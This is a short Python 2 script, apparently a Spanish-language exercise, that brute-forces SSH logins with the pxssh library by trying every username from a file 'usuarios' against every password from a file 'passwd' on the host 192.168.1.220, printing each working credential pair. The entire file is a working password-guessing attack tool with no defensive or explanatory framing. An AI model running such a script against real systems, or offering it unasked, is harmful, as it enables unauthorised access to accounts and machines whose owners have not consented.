#!/usr/bin/python
import pxssh

def fuerzaBruta(hostname, username, password):
	try:
		s = pxssh.pxssh()
		s.login (hostname, username, password, auto_prompt_reset=False)
		print '[+] Login successful for : '+ username + ':' + password
	except:
		print "[-]Failed " + username + ':' + password
		

def main():
	usernames = open('usuarios')
	for username in usernames:
		passwords = open('passwd')
		for password in passwords:
			fuerzaBruta('192.168.1.220', username, password)


if __name__ == "__main__":
	main()
